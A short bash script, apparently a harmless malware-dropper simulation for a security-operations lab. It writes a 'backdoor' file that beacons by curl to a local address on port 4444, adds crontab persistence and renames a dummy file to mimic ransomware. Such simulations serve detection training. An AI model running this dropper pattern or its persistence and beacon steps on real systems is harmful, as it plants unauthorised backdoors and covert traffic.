#!/bin/bash
# Fake malware dropper - harmless simulation
echo "[*] Dropper running..."
mkdir -p /opt/socaas-lab 2>/dev/null
# Simulate backdoor installation
cat > /opt/socaas-lab/backdoor.bin << 'EOF'
#!/bin/bash
# Simulated C2 connection
while true; do
    sleep 10
    curl -s http://192.168.122.1:4444/beacon >/dev/null 2>&1
done
EOF
chmod +x /opt/socaas-lab/backdoor.bin
# Add persistence via crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /opt/socaas-lab/backdoor.bin") | crontab -
# Simulate ransomware by renaming dummy files
mkdir -p /opt/socaas-lab/docs
echo "Important document" > /opt/socaas-lab/docs/secret.txt
mv /opt/socaas-lab/docs/secret.txt /opt/socaas-lab/docs/secret.txt.locked
echo "[*] Dropper finished"
